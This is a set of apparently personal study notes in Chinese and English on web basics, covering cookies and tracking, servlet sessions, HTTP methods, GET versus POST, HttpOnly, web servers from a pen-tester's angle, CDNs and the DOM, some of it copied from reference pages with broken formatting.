Requirements for cookies across the EU are defined in Directive 2009/136/EC of the European Parliament and came into effect on 25 May 2011. A directive is not a law by itself, but a requirement for EU member states to put laws in place that meet the requirements of the directive. The actual laws can differ from country to country.
In short the EU directive means that before somebody can store or retrieve any information from a computer, mobile phone or other device, the user must give informed consent to do so. Many websites have added banners (AKA "cookie banners") since then to inform the user about the use of cookies.
For more, see this Wikipedia section and consult state laws for the latest and most accurate information.
Zombie cookies and Evercookies
A more radical approach to cookies are zombie cookies or "Evercookies" which are recreated after their deletion and are intentionally hard to delete forever. They are using the Web storage API, Flash Local Shared Objects and other techniques to recreate themselves whenever the cookie's absence is detected.
- Evercookie by Samy Kamkar
- Zombie cookies on Wikipedia
                 ▪


## 第三方cookie 通常cookie的域和浏览器地址的域匹配，这被称为第一方cookie。 第三方cookie就是cookie的域和地址栏中的域不匹配
这种cookie通常被用在第三方广告网站。 为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，
给用户推送相关的广告。
1. 用户访问服务器1的一个⻚面index.html，这个⻚面和第三方 广告网站合作有一张advertisement.com域名下的一张广告图. ad1.img
  - 用户请求这张ad1.jpg图片，
  - www.advertisement.com服务器会给用户设置cookie
  - 记录用户的浏览记录，分配一个user来表示用户的 身份。
  - Set-Cookie: user="wang";like="a"; 1,623

          domain="advertisement.com"
2. 用户访问服务器2的一个index.html⻚面，这个⻚面也和同一 家广告商合作包含一张advertisement.com域名下的一张广告 图ad2.jpg，
  - 当用户请求这张ad2.jpg图片的时候，浏览器就会向 www.advertisement.com发送cookie
  - Cookie: user="wang"; like="a";
  - www.advertisement.com收到浏览器发送的cookie识别 了用户的身份，同时又把这个⻚面用户的浏览数据设置 cookie
  - Set-Cookie: buy="b"; domain="advertisement.com"
3. 用户访问服务器3的一个index.html⻚面，这个⻚面也和那一 家广告商合作包含一张www.advertisement.com域名下的一 张广告图ad3.jpg，
  - 当用户请求这张ad3.jpg图片的时候，浏览器就会向 www.advertisement.com发送cookie
  - Cookie: user="wang"; like="a"; buy="b"
4. 这样广告公司就可以根据用户的浏览习惯，给用户推送合适的 广告。 自动登录的Cookie的操作: 添加Cookie
获取Cookie
// 因为取得的是整个网⻚作用域的Cookie的值，所以得到的
是个数组
  Cookie[] cookies = request.getCookies();
  for(int i = 0 ; i < cookies.length ; i++){
    String name = cookies[i].getName() ;
Cookie cookie = new Cookie("user", "suntao");
cookie.setMaxAge(7*24*60*60); // 一星期有效 response.addCookie(cookie);
 ▪


##     String value = cookies[i].getValue() ;
   }
HttpSession 会话机制 -->Servlet的会话机制的实现
创建于服务器端，保存于服务器，维护于服务器端,每创建一个新的 Session,服务器端都会分配一个唯一的ID，并且把这个ID保存到客 户端的Cookie中，保存形式是以JSESSIONID来保存的。
通过HttpServletRequest.getSession 进行获得HttpSession对象， 通过setAttribute()给会话赋值，可以通过invalidate()将其失效。
每一个HttpSession有一个唯一的标识SessionID，只要同一次打 开的浏览器通过request获取到session都是同一个。
WEB容器默认的是用Cookie机制保存SessionID到客户端，并 将此Cookie设置为关闭浏览器失效，Cookie名称为:
JSESSIONID 每次请求通过读取Cookie中的SessionID获取相对应的Session
会话
HttpSession的数据保存在服务器端，所以不要保存数据量耗资 源很大的数据资源，必要时可以将属性移除或者设置为失效
HttpSession可以通过setMaxInactiveInterval()设置失效时间(秒) 或者在web.xml中配置
<session-config>
     ▪


## <!--单位:分钟--> <session-timeout>30</session-timeout>
 </session-config>
|--HttpSession默认使用Cookie进行保存SessionID，当客户端禁 用了Cookie之后，可以通过URL重写的方式进行实现。
可以通过response.encodeURL(url) 进行实现
API对encodeURL的结束为，当浏览器支持Cookie时，url不做 任何处理;当浏览器不支持Cookie的时候，将会重写URL将 SessionID拼接到访问地址后。
HTTP request methods
HTTP defines a set of request methods to indicate the desired action to be performed for a given resource.
Although they can also be nouns, these request methods sometimes referred to as HTTP verbs.
Each of them implements a different semantic, but some common
features are shared by a group of them: e.g. a request method can
be safe, idempotent, or cacheable. +---------+-------------------------------------------------+-------+
| Method | Description | Sec. | +---------+-------------------------------------------------+-------+
| GET | Transfer a current representation of the target resource.
         | HEAD section.
| POST
| Same as GET, but only transfer the status line and header
| PUT
the request payload.
DELETE
| Perform resource-specific processing on the request payload. | Replace all current representations of the target resource with
| DELETE | Remove all current representations of the target resource.
| CONNECT | Establish a tunnel to the server identified by the target resource.
| OPTIONS | Describe the communication options for the target resource.
| TRACE | Perform a message loop-back test along the path to the target resource.
+---------+-------------------------------------------------+-------+
GET method
requests a representation of the specified resource. Requests using GET should only retrieve data.
The   method asks for a response identical to that of a GET request, but without the response body.
The   method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server.
PUT
The PUT method replaces all current representations of the target resource with the request payload.
The     method deletes the specified resource.
The   method establishes a tunnel to the server identified by the target resource.
The   method is used to describe the communication options for the target resource.
The   method performs a message loop-back test along the path to the target resource.
The   method is used to apply partial modifications to a resource.
Specifications
  HEAD
 HEAD
 POST
  DELETE
POST
  CONNECT
 CONNECT
 OPTIONS
 TRACE
OPTIONS
  TRACE
 PATCH
 PATCH ▪


##       Specificatio n
      Title
     Comment
     RFC 7231, section 4: Request methods
          Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content
    Specifies GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE.
     RFC 5789, section 2: Patch method
        PATCH Method for HTTP
   Specifies PATCH.
    Browser compatibility
No compatibility data found. Please contribute data for "http/ methods" (depth: 1) to the MDN compatibility data repository. See also
- HTTP headers Metadata
Last modified: Feb 1, 2020, by MDN contributors HTML
a method to mark up hypertext so it will display accordingly in a browser.
HTML files consist of tags to tell the browser how to display the data
inside.
  - Tags: <img>, <table>, <body>, <form>, <head>, <input type=
>...
This simplicity makes HTML easy to work with but also has its own
issues.
  - Example
  - < Character: as soon as the browser sees it, it thinks everything
past it is a tag, until it sees the close character, >.
  - To get around this, HTML entities were created
  - a way of telling the browser to display those characters it would otherwise look at as a tag or part of the programming itself.
         ▪


##  ⁃
HTTP request methods
pretty straightforward and easy to understand
HTTP works as a request-response protocol, and several request
methods are available.
HTTP request methods include GET, HEAD, POST, PUT, TRACE, and CONNECT
- The GET: retrieve whatever information (in the form of an entity) is identified by the Request-URI.
  - basically requests data from a resource: “Please send me the HTML for the web page located at _insert-URL- here_.”
  - The problem: used HTTP GET to send data, when sending data, the GET method adds the data to the URL.
  - Example
  - a GET was used in answering a bill for a credit card.
  - the URL display like this: http://www.example.com/checkout?
7568.asp/credit1234567890123456 (the underlined section
showing the ridiculousness of using GET in this way).
  - GET请求会向数据库发索取数据的请求，从而来获取信息，该请
求就像数据库的select操作一样，只是用来查询一下数据，不会
     修改、增加数据，不会影响资源的内容
  - 请求不会产生副作用。无论进行多少次操作，结果都是一样的。
- The HEAD: identical to GET, except that the server MUST NOT return a message-body in the response.
  - 与 GET 相同，但只返回 HTTP 报头，不返回文档主体。
  - often used for testing hypertext links for validity, accessibility,
and recent modification, and requesting headers and metadata.
 - The POST: request the origin server accept the entity enclosed in the request as a new subordinate of the resource identified by the Request-URI in the Request-Line.
  - The actual function performed by the POST method is determined by the server and dependent on the Request-URI.
  - a better method of submitting data to a resource for processing. It can also be used to elicit a response, but its primary purpose is to provide data for the server to work with.
  - POST请求同PUT请求类似，都是向服务器端发送数据的，但是 该请求会改变数据的种类等资源，就像数据库的insert操作一 样，会创建新的内容。几乎目前所有的提交操作都是用POST请 求的。
  - safer than GET because:
  - an admin can make it so it’s not stored in browser history
or in the server logs,
  - it doesn’t display returned data in the URL.
- The PUT: requests that the enclose dentity be stored under the supplied Request-URI.
  - 上传指定的 URI 表示。
  - If the Request-URI refers to an already existing resource, the
enclosed entity SHOULD be considered as a modified version
of the one residing on the origin server.
  - If the Request-URI does not point to an existing resource, and
that URI is capable of being defined as a new resource by the requesting user agent, the origin server can create the resource with that URI.
  - PUT请求是向服务器端发送数据的，从而改变信息，该请求就像 数据库的update操作一样，用来修改数据的内容，但是不会增加 数据的种类等，也就是说无论进行多少次PUT操作，其结果并没 有不同。
- The DELETE: the origin server delete the resource identified by the Request-URI.
- The TRACE: to invoke a remote, application-layer loop-back of the request message.
  - The final recipient of the request SHOULD reflect the message received back to the client as the entity-body of a 200 (OK) response.
- The CONNECT: reserved for use with a proxy that can dynamically 1,633

▪
switch to being a tunnel (e.g., SSL tunneling).   - 把请求连接转换到透明的 TCP/IP 通道。
- OPTIONS
  - 返回服务器支持的 HTTP 方法。
NOTE
Both POST and GET are client-side ideas that can be manipulated with a web proxy.
  - GET 用于获取信息，是无副作用的，是幂等的，且可缓存
  - POST 用于修改服务器上的数据，有副作用，非幂等，不可缓存
While GET is visible in a browser, POST is equally visible within a good old Wiresharkcapture.
GET与POST的区别。
1. GET使用URL或Cookie传参，而POST将数据放在BODY中。使用上的 区别。
2. GET方式提交的数据有⻓度限制，则POST的数据则可以非常大。使用 上的区别。
  - HTTP协议对GET和POST都没有对⻓度的限制。HTTP协议明确 地指出了，HTTP头和Body都没有⻓度的要求。
  - POST也是一样，POST是没有大小限制的，HTTP协议规范也没 有对POST数据进行大小限制，起限制作用的是服务器的处理程 序的处理能力。
  - 1. 浏览器。早期的浏览器会对URL⻓度做限制。
  - 如果我们使用GET通过URL提交数据，那么GET可提交的 数据量就跟URL的⻓度有直接关系了。URL不存在参数上
限的问题，HTTP协议规范没有对URL⻓度进行限制。这个
        限制是特定的浏览器及服务器对它的限制。
  - IE对URL⻓度的限制是2083字节(2K+35)。对于其他浏览
器，如Netscape、FireFox等，理论上没有⻓度限制，其限
        制取决于操作系统的支持。
  - 这个限制是整个URL⻓度，而不仅仅是你的参数值数据⻓
度。
   - 2. 服务器。URL⻓了，对服务器处理也是一种负担。
  - 原本一个会话没有多少数据，如果有人恶意地构造几个M
大小的URL，并不停地访问你的服务器。服务器的最大并
发数显然会下降。
  - 另一种攻击方式是，告诉服务器Content-Length是一个很
       大的数，然后只给服务器发一点儿数据，服务器你就傻等
       着去吧。哪怕你有超时设置，这种故意的次次访问超时也
       能让服务器吃不了兜着走。
  - 有鉴于此，多数服务器出于安全啦、稳定啦方面的考虑， 会给URL⻓度加限制。但是这个限制是针对所有HTTP请求 的，与GET、POST没有关系。
3. POST比GET安全，因为数据在地址栏上不可⻅。使用上的区别。
  - 通过GET提交数据，用户名和密码将明文出现在URL上
  - 登录⻚面有可能被浏览器缓存，其他人查看浏览器的历史纪录，
那么别人就可以拿到你的账号和密码了，除此之外，使用GET提
交数据还可能会造成Cross-site request forgery攻击。
4. GET和POST最大的区别主要是GET请求是幂等性的，POST请求不
是。本质区别
  - 幂等性: 一次和多次请求某一个资源应该具有同样的副作用。对
同一URL的多个请求应该返回同样的结果。
  - 正因为它们有这样的区别，所以不应该且不能用get请求做数据
的增删改这些有副作用的操作。因为get请求是幂等的，在网络 不好的隧道中会尝试重试。如果用get请求增数据，会有重复操 作的⻛险，而这种重复操作可能会导致副作用(浏览器和操作系 统并不知道你会用get请求去做增操作)。
  - 你是一位道具师，演员在拍电影时大家都约定俗成在对打时用假 抢(无杀伤力)，在打靶时用气枪(有杀伤力)，而你是个异类 的道具师，你在对打时把演员的假抢换成了气枪...
1. 提交方式的区别
  - get是把参数数据队列加到提交表单的action属性所指的url中，值
和表单内各个字段一一对应，从url中可以看到;
  - post是通过HTTPPOST机制，将表单内各个字段与其内容防止在 ▪


## 到这个过程
  - Get: 服务器端用Request.QueryString获取变量的值
  - Post: 服务器端用Request.Form获取提交的数据
  - get传送的数据量较小，post传送的数据量较大，一般被默认不受
限制，但在理论上，IIS4中最大量为80kb，IIS5中为1000k，get 安全性非常低，post安全性较高
HTTP response messages
The first digit of the Status-Code defines the class of response. The last two digits do not have any categorization role, but more thoroughly define the response intent.
There are five values for the first digit:
1xx: Informational: Request received, continuing process.
2xx: Success: The action was successfully received, understood, and
accepted.
3xx: Redirection: Further action must be taken in order to complete therequest
4xx: Client Error: The request contains bad syntax or cannot be fulfilled.
5xx: Server Error: The server failed to fulfill an apparently valid request.
Could sending a URL requesting a resource and receiving:
a 5xx message back help determine server issues? Maybe.
A 4xx receipt? Better check my URL and see if it’s right. A 3xx return? That might be very interesting....
HttpOnly cookies
implemented in 2002 by Microsoft Internet Explorer developers for
Internet Explorer 6 SP1.
an additional flag included in a Set-Cookie HTTP response header.
Using it when generating a cookie helps mitigate the risk of client side script accessing the protected cookie (if the browser supports it).
The example below shows the syntax used within the HTTP response
           - ▪


## header:
  - Set-Cookie: <name>=<value>[; <Max-Age>=<age>]
  - [; expires=<date>][; domain=<domain_name>]
  - [; path=<some_path>][; secure][; HttpOnly]
If the HttpOnly flag (optional) is included in the HTTP response
header
  - the cookie cannot be accessed through client side script (if the
browser supports this flag).
  - So even a cross-site scripting (XSS) flaw exists, and a user
accidentally accesses a link that exploits this flaw, the browser (primarily Internet Explorer) will not reveal the cookie to a third party.
If a browser does not support HttpOnly and a website attempts to set an   cookie
  - the   flag will be ignored by the browser, thus creating a traditional, script accessible cookie.
  - As a result, the cookie (typically your session cookie) becomes vulnerable to theft of modification by malicious script. Mitigating.
Web Sewers
The most widely used web servers: Microsoft IIS, Apache, and Sun Java System Application Server.
Microsoft IIS:
  - Internet Information Services (IIS) servers
  - easy-to-manage, Windows-based options
  - was riddled with security concerns
   HttpOnly
HttpOnly
 ▪


##   - IIS 5 or earlier server at your target is cause for wild celebration on the pen test team.
  - even the IIS 7.0 version, which Microsoft said included “a new modular design that allows for a lessened attack surface and increased performance,” caused many a hacker to start giggling uncontrollably.
  - Later versions, better job of tightening the security screws.
  - Versions
  - IIS 5.1: Windows XP Professional,
  - IIS 6.0: Windows Server 2003 / XP Professional x64 Edition,
  - IIS 7.0: Windows Longhorn Server and Windows Vista. The Apache HTTP Server: 54.9%
  - the most popular Web server, Market leader,
  - open source, powerful, and fast web server
  - developed by the Apache Software Foundation for Windows, Unix, Novel Netware, and a number of other operating systems.
  - Version 2.2.4 of Apache HTTP server has recently been released.
  - typically runs on a Unix or Linux platform, although you can load and use it on a wide variety of operating systems.
   - haven’t seemed to display as many / serious vulnerabilities as Microsoft IIS, but this isn’t to say they are foolproof.
  - Several critical vulnerabilities on Apache servers have come to light in the past, making them as easy a target as anything else.
  - The httpd.conf file: controls all sorts of stuff, including who can view the server status page (which just so happens to contain information on the server, hosts connected, and requests being attended to).
  - The php.ini file: for the verbose error messaging setting.
  - built modularly, with a core to hold all the “magic” and
modules to perform a wide variety of functions.
  - open source, huge library of publicly available add-ons to support all sorts of functions and services.
  - the database does not have to be in the same OS container; in fact, it really shouldn’t be.
⁃
 ▪


##  The Sun Java System Application Server is also available at no cost in three editions from Sun Microsystems.
  - This software provides a Java 2 platform for developing and delivering Java Web applications and services.
- Nginx: 27.6%.
  - public release in 2004
  - use by such recognizable Internet residents as Netflix, Hulu, the Discovery Channel, Dropbox, Pinterest...
  - Benchmarks prove Nginx edges out other lightweight web servers and proxies, and simply blows the doors off others (Linux Journal didn’t trust the press and ran their own tests, largely coming to the same conclusion).
  - Nginx is “a free, open-source, high-performance HTTP server and reverse proxy, as well as an IMAP/POP3 proxy server. Unlike traditional servers, Nginx doesn’t rely on threads to handle requests. Instead it uses a much more scalable event-driven (asynchronous) architecture. This architecture uses small, but more importantly, predictable amounts of memory under load.”
  - a high-performance web server that requires only small resources to run and has proven itself capable of running everything from small family sites to multinational clusters is a challenger to Microsoft and IIS.
NOTE
in network design. N-tier architecture (multitier architecture) distributes processes across multiple servers.
- Each “tier” consists of a single role carried out by one (or more / cluster of) computer systems.
- Typically this is carried out in “three-tier architecture,” with a presentation tier, logic tier, and data tier, but there are other implementations.
Apache or an IIS server vulnerability
- misconfiguration of the settings, the most common vulnerability exploited
  - include error messaging, default passwords, SSL certificates, scripts, remote administrative functions, configuration files, and services on the machine.
  - Settings such as properly configuring (restricting?) remote administration, eliminating unnecessary services, and changing any default passwords or accounts...
- error reporting
  - Helpful for troubleshoot, but useful to a bad guy too
- Are the SSL certificates in place current? What about default passwords? Are the config files and scripts properly protected and configured?
  - Keep those configuration issues in mind when you start scratching at the front door; they’re usually keys that can open a lock or two.

---

## CDN 内容分发网络 Content Delivery / Distribute Network

- 基本思路:
  - 尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和 环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务 器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN 系统能够实时地根据网络流量和各节点的连接、负载状况以及到用 户的距离和响应时间等综合信息将用户的请求重新导向离用户最近 的服务节点上。

- 目的:
  - 解决因分布、带宽、服务器性能带来的访问延迟问题
  - 适用于站 点加速、点播、直播等场景。
  - 使用户可就近取得所需内容，解决 Internet网络拥􏰙的状况，提高用户访问网站的响应速度和成功 率。
  - 控制时延无疑是现代信息科技的重要指标，CDN的意图就是尽 可能的减少资源在转发、传输、链路抖动等情况下顺利保障信息的 连贯性。 和触达每一个用户，带来更为极致的使用体验。✫10 s: 超过该时 间的时延会使用户失去等待意愿。
  - “我把坚果从一个距离他们很远的筐里盛出来，放在距离他们很 近的眼前，让他们不用一次次起身费劲的去抓，而是坐在那儿就能 够到”

CDN的本质是缓存，而内核中支撑它的互联网精神则是共享

- 基础架构:

最简单的CDN网络由一个DNS服务器和几台缓存服务器组成:
1. 当用户点击网站⻚面上的内容URL，经过本地DNS系统解析，DNS系统会最终将域名的解析权交给CNAME指向的CDN专用DNS服务器。
2. CDN的DNS服务器将CDN的全局 负载均衡设备IP地址返回用户。
3. 用户向CDN的全局负载均衡设备发起内容URL访问请求。
4. CDN全局负载均衡设备根据用户IP地址，以及用户请求的内容URL，选择一台用户所属区域的区域 负载均衡设备，告诉用户向这台设备发起请求。
5. 区域负载均衡设备会为用户选择一台合适的缓存服务器提供服
务，选择的依据包括:根据用户IP地址，判断哪一台服务器距 用户最近;根据用户所请求的URL中携带的内容名称，判断 哪一台服务器上有用户所需内容;查询各个服务器当前的负载 情况，判断哪一台服务器尚有服务能力。基于以上这些条件的 综合分析之后，区域负载均衡设备会向全局负载均衡设备返回 一台缓存服务器的IP地址。
6. 全局负载均衡设备把服务器的IP地址返回给用户。
7. 用户向缓存服务器发起请求，缓存服务器响应用户请求，将用
  户所需内容传送到用户终端。如果这台缓存服务器上并没有用
  户想要的内容，而区域均衡设备依然将它分配给了用户，那么
  这台服务器就要向它的上一级缓存服务器请求内容，直至追溯
  到网站的源服务器将内容拉到本地。
特点:
1、本地Cache加速，提高了企业站点(尤其含有大量图片和静 态⻚面站点)的访问速度，并大大提高以上性质站点的稳定性
2、镜像服务消除了不同运营商之间互联的瓶颈造成的影响，实 现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的 访问质量。
3、远程加速 远程访问用户根据DNS负载均衡技术 智能自动选 择Cache服务器，选择最快的Cache服务器，加快远程访问的速度
4、带宽优化 自动生成服务器的远程Mirror(镜像)cache服务 器，远程用户访问时从cache服务器上读取数据，减少远程访问的 带宽、分担网络流量、减轻原站点WEB服务器负载等功能。
5、集群抗攻击 广泛分布的CDN节点加上节点之间的智能冗余机 制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的 影响，同时保证较好的服务质量 。
推荐使用CDN? 一般来说以资讯、内容等为主的网站，具有一定访问体量的网站  资讯网站、政府机构网站、行业平台网站、商城等以动态内容为
主的网站
论坛、博客、交友、SNS、网络游戏、搜索/查询、金融等。提 供http下载的网站
 软件开发商、内容服务提供商、网络游戏运行商、源码下载等有
大量流媒体点播应用的网站
 拥有视频点播平台的电信运营商、内容服务提供商、体育频道、
宽频频道、在线教育、视频博客等
    Cons:
1. 实现跨运营商、跨地域的全网覆盖
互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都 造成了网站的区域性无法访问。CDN加速可以覆盖全球的线路， 通过和运营商合作，部署IDC资源，在全国⻣干节点商，合理部署 CDN边缘分发存储节点，充分利用带宽资源，平衡源站流量。阿 里云在国内有500+节点，海外300+节点，覆盖主流国家和地区不是 问题，可以确保CDN服务的稳定和快速。
第一:有利于GOOGLE等搜索排名
GOOGLE已经把网站的打开速度当做一个重要的指标，所以网 站的打开速度会影响排名。
使用CDN之后，网站由于打开速度变快，这样可以减少跳出 率，也可以增加用户对网站的友好体验。
第二:有利于转化
 毫无疑问，用户访问网站的时间提高了，跳出率减少了，当然会
利于网站的转化率和销售量。
大家应该都没有耐心去等一个需要10秒才能打开的网站，这样的 网站一开始就不友好，更别想提高网站的转化率了。
第三:网站不容易宕机
如果网站没有使用CDN，如果在同一时间涌入大量的流量，那 么网站就会很可能会宕机。
使用CDN之后，可以减少网站宕机的情况，同时您的网站可以 接收更多的流量。
 2. 保障网站安全
CDN的负载均衡和分布式存储技术，可以加强网站的可靠性， 相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联 网攻击事件。防攻击系统也能避免网站遭到恶意攻击。
3. 异地备援
当某个服务器发生意外故障时，系统将会调用其他临近的健康服 务器节点进行服务，进而提供接近100%的可靠性，这就让你的网 站可以做到永不宕机。
4. 节约成本投入
使用CDN加速可以实现网站的全国铺设，你根据不用考虑购买 服务器与后续的托管运维，服务器之间镜像同步，也不用为了管理 维护技术人员而烦恼，节省了人力、精力和财力。
5. 更专注业务本身
CDN加速厂商一般都会提供一站式服务，业务不仅限于CDN， 还有配套的云存储、大数据服务、视频云服务等，而且一般会提供 7x24运维监控支持，保证网络随时畅通，你可以放心使用。并且将 更多的精力投入到发展自身的核心业务之上。
1、网站站点/应用加速
站点或者应用中大量静态资源的加速分发，建议将站点内容进行 动静分离，动态文件可以结合云服务器ECS，静态资源如各类型图 片、html、css、js文件等，建议结合 对象存储OSS 存储海量静态
   资源，可以有效加速内容加载速度，轻松搞定网站图片、短视频等
内容分发
2、视音频点播/大文件下载分发加速
支持各类文件的下载、分发，支持在线点播加速业务，如mp4、 flv视频文件或者平均单个文件大小在20M以上，主要的业务场景是 视音频点播、大文件下载(如安装包下载)等，建议搭配对象存储 OSS使用，可提升回源速度，节约近2/3回源带宽成本。
3、视频直播加速(内测中)
 视频流媒体直播服务，支持媒资存储、切片转码、访问鉴权、内
容分发加速一体化解决方案。结合弹性伸缩服务，及时调整服务器
带宽，应对突发访问流量;结合媒体转码服务，享受高速稳定的并
 行转码，且任务规模无缝扩展。目前CDN直播加速已服务内部用 户测试并优化，即将上线，敬请期待
 4、移动应用加速
移动APP更新文件(apk文件)分发，移动APP内图片、⻚面、 短视频、UGC等内容的优化加速分发。提供httpDNS服务，避免 DNS劫持并获得实时精确的DNS解析结果，有效缩短用户访问时 间，提升用户体验。  对于初次接触和使用CDN服务的直播或者短视频平台，
视界云认为其中有两个核心的点需要被关注:技术指标数据&服 务支撑。
技术指标数据:
总体上:
 稳定运行、良好的性价比、灵活便捷、节点覆盖范围广、质量有
保证、丰富的行业经验和为人称道的服务意识、
DNS 调度准确、宽带统计的准确度高、回源带宽低、统计数据 指标多、内容的刷新时间和内容的预读取速度快、日志统计的即时 性等
 ◎测试时的技术指标数据:
 包括但不局限于延时、卡顿率、下载速度、打开速度、回源率、 宽带冗余提升率等
由左至右:视界云音视频直播加速-音视频点播加速-文件下载加 速
◎四种场景下CDN技术指标数据:主要涵盖小文件、大文件、 音视频点播、音视频直播
小文件即网⻚素材，通常是指图片素材涵盖类型包括但不限于 html、js、jpg、png、css。网⻚类的CDN加速，此类场景下对延 迟最为敏感。
根据全球第三方测速的公司Gomez官方数据显示:当⻚面加载 时间超过7秒后， 50%的用户会选择放弃，且每增加1秒的延迟会带 来7%转换率的下降。一般情况，100K的网⻚素材加载总时间低于 250ms算优质CDN。
延迟细分下来又可分为4个模块:域名解析时间、建立连接时 间、首包时间、内容下载时间。
域名解析时间这个时间维度和CDN具有一定程度的关系，刚购 买的域名通常解析时间会很⻓ 有时超过300ms 甚至达到几秒，当 网站的访问带宽超过100M时时间会平稳控制在100~150ms。此外 时间的⻓短和各个省分的本地DNS缓存策略也有一定的关系。
建立连接时间则是指DNS解析完成到找到对应IP后建立TCP连接 的时间。由于TCP建立的流程是固定的三次握手，排查机器负载过 高的原因外，这个时间可以反映出CDN服务的节点资源以及调度 能力，离得越近的节点建立连接时间越短，一般在几十ms内。
而首包时间就反映的CDN服务节点程序的代码能力了，连接之 后服务端程序多⻓时间会调度处理，如果时间过高很可能导致机器 负载过高。  内容下载时间对于小文件场景一般参考意义不是特别大，通常时
间很短。
大文件包括类型为apk、rar、zip、ipa等一些列大小大于10M的 文件。大文件的场景相较小文件场景更为简单，也是CDN服务中 对质量要求没那么苛刻的场景。其核心指标简言之就是下载速度或 总下载时间。
 小文件和大文件大多基于网⻚类，而音视频此类属于流媒体类。
音视频点播包括类型为mp4、flv、mkv 、wmv等音视频文件。 点播场景会比较注看重卡顿比率，更准确的说点播可以算是大文件 中一个分支，但点播场景的CDN服务质量要求比大文件下载要严 苛一些。
这方面主要是看2个核心指标:首播时间和再缓存时间。首播时 间即从打开到看到视频画面的时间，会受域名解析、连接、第一包 时间的影响，首播时间控制在1秒内算是不错的效果。其次是再缓 冲时间，代表的意义是用户观看视频时的卡顿时间。由于实际服务 中视频⻓度不一，一般会做播放统计的体验统计，主要监测的是卡 顿率(卡顿率:把所有用户播放视频的卡顿时间上报，100个用户 里面有 90个是播放过程中完全无卡顿的即卡顿率10% )
音视频直播全协议支持 ，此类场景对于CDN服务来说，核心指 标和点播有些类似。鉴于直播的时⻓通常较⻓，因此首播时间和卡 顿率两个指标则变得更加通用。行业内而言直播首播时间300ms， 卡顿率在15%以下算是优质的CDN服务。
服务支撑
 价格这点的重要性是基于服务一致性层面上的，选择最优质性价
比的服务模式。 障后，关注的⻆度主要转变为后续的服务能力，主要涵盖以下三
点:
☆平台的稳定性:
主要体现在CDN的节点数以及节点质量、内部的监控水平、 DNS的调度能力等
 ☆平台的定制化和全方位服务:
 视界云具有极强的系统健壮性和扩展性，在保持成熟稳定的同时
支持各类业务需求的定制!
需求对接阶段:在需求对接时，视界云PM与您进行1对1的需求 沟通，确认您的具体需求，所有这些需求都会在签约后交由视界云 着手落实
测试阶段:包括功能测试和性能测试，视界云PM将会在测试期 间按照商定的测试方法和指标向您提供测试报告
商务阶段:测试结果直到令您满意，双方再就计费模式、价格、 QoS等事宜进行沟通，达成合作意向后再行签订合同
切量阶段:视界云PM与您沟通确认切量的时间和宽带，切量时 视界云团队将现场进行服务跟踪和保障
7x24技术服务阶段:视界云为客户配备了专⻔的技术专家小组， 提供7*24小时技术支持服务，有效规避潜在技术⻛险，随时解决突 发问题，帮助客户实现平滑过渡   ☆问题的及时响应和解决:
CDN服务过程中不可避免的会出现或大或小的一些问题，出现 诸如此类的问题并不可怕，可怕的是出现问题后，这些问题能否得 到及时并且高效率的解决!基于此，一套专业的应急方案，一支专 业负有强大责任感的客服运维团队的重要性便显得尤其重要。
视界云拥有7x24服务体系，运维工程师24小时在岗，有效规避潜 在技术⻛险，随时解决突发问题，面对突发问题，能够即刻做出响 应!
 对于小问题的早一步发现，大问题的提前觉察和感知，更稳更准
更狠的解决出现的问题!
言而总之，此方面除了CDN服务公司的专业能力之外，责任感 也是一个不可忽略的万分重要的因素 Document Object Model (DOM)
  A Web page is a document.
- This document can be either displayed in the browser or as the HTML source.
- But it is the same document in both cases.
The Document Object Model (DOM)
- an object-oriented representation of the web page, which can be modified with
a scripting language such as JavaScript.
  - It defines the logical structure and content of web documents and the
way a document is accessed and manipulated.
  - documents have a logical structure which is very much like a tree
  - Use structure model to describe the tree-like representation of a document
- one important objective for the DOM is to provide a standard programming
interface that can be used in a wide variety of environments and applications
  - a programming API for HTML and XML documents.
- XML presents this data as documents, representing many different kinds of information that may be stored in diverse systems
- and the DOM may be used to manage this data.
- The DOM represents the document as nodes and objects so it can be manipulated.
  - so programming languages can connect to the page.
  - represents the page so programs can change the document structure,
style, and content.
  - With the Document Object Model, programmers can create and build
documents, navigate their structure, and add, modify, or delete elements
and content.
  - Almost everything found in an HTML or XML document can be accessed,
changed, deleted, or added using the Document Object Model,
The W3C DOM and WHATWG DOM standards are implemented in most modern browsers. Many browsers extend the standard, so care must be exercised when using
     ▪


## them on the web where documents may be accessed by various browsers with different DOMs.
For example
the standard DOM specifies that the getElementsByTagName method in the code below must return a list of all the <p> elements in the document:
All properties, methods, and events available for manipulating and creating web pages are organized into objects
for example
  - the document object: represents the document itself
  - the table object: implements the special HTMLTableElement DOM
interface for accessing HTML tables ⁃...
This documentation provides an object-by-object reference to the DOM.
The modern DOM is built using multiple APIs that work together. This is expanded upon as needed by other APIs that add new features and capabilities to the DOM.
 const paragraphs = document.getElementsByTagName("p");
// paragraphs[0] is the first <p> element
// paragraphs[1] is the second <p> element, etc. alert(paragraphs[0].nodeName);
      - ◆
•
The core DOM defines the objects that fundamentally describe a document and the objects within it.
the HTML DOM API adds support for representing HTML documents to the core DOM.
•
</ROWS> </TABLE>
⁃
⁃
<TABLE> <ROWS>
⁃
⁃
  - ⁃
<TR>
  - <TD>Shady Grove</TD>
  - <TD>Aeolian</TD>
</TR>
<TR>
  - <TD>Over the River, Charlie</TD>
  - <TD>Dorian</TD>
</TR> ▪


##  DOM and JavaScript
nearly all of the examples is written in JavaScript,
but uses the DOM to access the document and its elements.
The DOM is not a programming language, but without it, the JavaScript language wouldn't have any model or notion of web pages,
HTML documents, XML documents, and their component parts (e.g. elements).
Every element in a document (the document as a whole, the head, tables within the document, table headers, text within the table cells) is part of the document object model for that document
  - so they can all be accessed and manipulated using the DOM and a scripting language like JavaScript.
In the beginning, JavaScript and the DOM were tightly intertwined, but eventually, they evolved into separate entities.
The page content is stored in the DOM
and may be accessed and manipulated via JavaScript approximative equation: API = DOM + JavaScript
The DOM was designed to be independent of any particular programming language,
making the structural representation of the document available from a single, consistent API. focus on JavaScript, but implementations of the DOM can be built for any language,
# Python DOM example
       ▪


